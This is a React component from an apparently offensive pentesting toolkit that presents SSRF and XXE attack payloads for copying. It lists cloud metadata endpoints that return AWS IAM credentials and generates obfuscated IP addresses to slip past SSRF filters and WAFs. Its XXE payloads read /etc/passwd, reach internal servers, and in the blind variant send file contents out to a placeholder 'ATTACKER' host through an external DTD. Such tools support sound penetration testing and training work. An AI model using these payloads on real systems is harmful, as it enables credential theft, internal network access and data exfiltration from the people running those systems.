import React, { useState, useEffect } from 'react';
import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
import { Globe, Copy, Check, Filter, FileCode } from 'lucide-react';

// SSRF Cloud Payloads Data (from HackTools)
const CLOUD_PAYLOADS = [
    {
        id: 1,
        name: "AWS EC2 Metadata",
        description: "Return IAM role associated with the ec2 instance and the credentials",
        steps: [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>/"
        ]
    },
    {
        id: 2,
        name: "Digital Ocean Metadata",
        description: "Digital Ocean metadata",
        steps: ["http://169.254.169.254/metadata/v1.json"]
    },
    {
        id: 3,
        name: "Azure Metadata",
        description: "Microsoft Azure Metadata",
        steps: ["http://169.254.169.254/metadata/v1/maintenance"]
    },
    {
        id: 4,
        name: "Google Cloud Metadata",
        description: "Google Cloud Metadata | require ('X-Google-Metadata-Request: True' or 'Metadata-Flavor: Google')",
        steps: ["http://169.254.169.254/computeMetadata/v1/"]
    }
];

export default function SSRFTool() {
    const [activeTab, setActiveTab] = useState('cloud');
    const [showToast, setShowToast] = useState(false);
    const [ipv4Input, setIpv4Input] = useState('127.0.0.1');
    const [obfuscatedIPs, setObfuscatedIPs] = useState<string[]>([]);

    const tabs = [
        { id: 'cloud', label: 'Cloud Payloads' },
        { id: 'filter', label: 'Filter Bypass' },
        { id: 'xxe', label: 'XXE Payloads' },
    ];

    // IP Obfuscation logic (from HackTools)
    useEffect(() => {
        const regex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!regex.test(ipv4Input)) {
            setObfuscatedIPs(['Invalid IPv4']);
            return;
        }

        const dec = ipv4Input.split('.').map(Number);
        const mutatedIPs = [];

        // Various IP obfuscation techniques
        mutatedIPs.push(`${((dec[0] << 24) | (dec[1] << 16) | (dec[2] << 8) | dec[3]) >>> 0}`);
        mutatedIPs.push(`${dec.map((num) => `0x${num.toString(16).padStart(2, '0')}`).join('.')}`);
        mutatedIPs.push(`${dec.map((num) => num.toString(8).padStart(3, '0')).join('.')}`);
        mutatedIPs.push(`${dec.map((num) => `0x${num.toString(16).padStart(10, '0')}`).join('.')}`);
        mutatedIPs.push(`${dec.map((num) => num.toString(8).padStart(10, '0')).join('.')}`);
        mutatedIPs.push(`${dec.map((num) => '0x' + num.toString(16).padStart(2, '0')).join('.')}`);
        mutatedIPs.push(`${dec.slice(0, 3).map((num) => '0x' + num.toString(16).padStart(2, '0')).join('.')}.${dec[3]}`);
        mutatedIPs.push(`${dec.slice(0, 3).map((num) => num.toString(8).padStart(4, '0')).join('.')}.${dec[3]}`);
        mutatedIPs.push(`0x${dec[0].toString(16).padStart(2, '0')}.0x${dec[1].toString(16).padStart(2, '0')}.${(dec[2] << 8) | dec[3]}`);
        mutatedIPs.push(`${dec[0].toString(8).padStart(4, '0')}.${dec[1].toString(8).padStart(4, '0')}.${(dec[2] << 8) | dec[3]}`);
        mutatedIPs.push(`${dec.slice(0, 2).map((num) => `0x${num.toString(16).padStart(2, '0')}`).join('.')}.${dec.slice(2).join('.')}`);
        mutatedIPs.push(`${dec.slice(0, 2).map((num) => num.toString(8).padStart(4, '0')).join('.')}.${dec.slice(2).join('.')}`);
        mutatedIPs.push(`${dec.slice(0, 1).map((num) => `0x${num.toString(16).padStart(2, '0')}`).join('.')}.${((((dec[1] << 8) | dec[2]) << 8) | dec[3]) >>> 0}`);
        mutatedIPs.push(`${dec[0].toString(8).padStart(4, '0')}.${((((dec[1] << 8) | dec[2]) << 8) | dec[3]) >>> 0}`);
        mutatedIPs.push(`${dec.slice(0, 1).map((num) => num.toString(8).padStart(4, '0')).join('.')}.${((((dec[1] << 8) | dec[2]) << 8) | dec[3]) >>> 0}`);

        setObfuscatedIPs([...new Set(mutatedIPs)]);
    }, [ipv4Input]);

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const copyAllIPs = () => {
        copyToClipboard(obfuscatedIPs.join('\n'));
    };

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white flex items-center gap-2">
                    <Globe className="text-htb-green" size={24} />
                    SSRF Attack Payloads
                </h2>
                <p className="text-gray-400">
                    Server-Side Request Forgery payloads for cloud metadata, filter bypass, and XXE attacks
                </p>
            </div>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            {/* Cloud Payloads Tab */}
            {activeTab === 'cloud' && (
                <div className="space-y-4">
                    <p className="text-sm text-gray-400">
                        Cloud service metadata endpoints accessible via SSRF vulnerabilities
                    </p>
                    {CLOUD_PAYLOADS.map((payload) => (
                        <Card key={payload.id} className="!p-4 space-y-2">
                            <div>
                                <h3 className="text-sm font-bold text-htb-green">{payload.name}</h3>
                                <p className="text-xs text-gray-400">{payload.description}</p>
                            </div>
                            <PayloadBlock content={payload.steps} />
                        </Card>
                    ))}
                </div>
            )}

            {/* Filter Bypass Tab */}
            {activeTab === 'filter' && (
                <div className="space-y-4">
                    <Card className="!p-6 space-y-4">
                        <div>
                            <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-2">IP Obfuscation</h3>
                            <p className="text-xs text-gray-500">
                                Generate IP address mutations to bypass SSRF filters and WAFs
                            </p>
                        </div>

                        <Input
                            placeholder="127.0.0.1"
                            value={ipv4Input}
                            onChange={(e) => setIpv4Input(e.target.value)}
                        />

                        <div className="flex justify-between items-center">
                            <p className="text-xs text-gray-500">
                                {obfuscatedIPs[0] !== 'Invalid IPv4' ? `${obfuscatedIPs.length} variations generated` : 'Enter a valid IPv4 address'}
                            </p>
                            {/* Copy All button removed as PayloadBlock has its own, but we might want it for the whole set if PayloadBlock handles "content" as one string. 
                                PayloadBlock joins array with newlines. So one copy button copies all. Perfect.
                            */}
                        </div>

                        <PayloadBlock
                            content={obfuscatedIPs}
                            className="max-h-96 overflow-y-auto"
                        />
                    </Card>
                </div>
            )}

            {/* XXE Payloads Tab */}
            {activeTab === 'xxe' && (
                <div className="space-y-4">
                    <p className="text-sm text-gray-400">
                        XML External Entity injection payloads for SSRF and data exfiltration
                    </p>

                    <Card className="!p-4 space-y-2">
                        <h3 className="text-sm font-bold text-htb-green">Basic XXE (In-Band)</h3>
                        <p className="text-xs text-gray-400">Direct file read via XXE</p>
                        <PayloadBlock content={`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>`} />
                    </Card>

                    <Card className="!p-4 space-y-2">
                        <h3 className="text-sm font-bold text-htb-green">XXE to SSRF</h3>
                        <p className="text-xs text-gray-400">Access internal services via XXE</p>
                        <PayloadBlock content={`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
<foo>&xxe;</foo>`} />
                    </Card>

                    <Card className="!p-4 space-y-2">
                        <h3 className="text-sm font-bold text-htb-green">Blind XXE (Out-of-Band)</h3>
                        <p className="text-xs text-gray-400">Data exfiltration via external DTD</p>
                        <PayloadBlock content={`<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
%xxe;
]>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
%eval;
%exfil;`} />
                    </Card>
                </div>
            )}

            {/* Toast */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
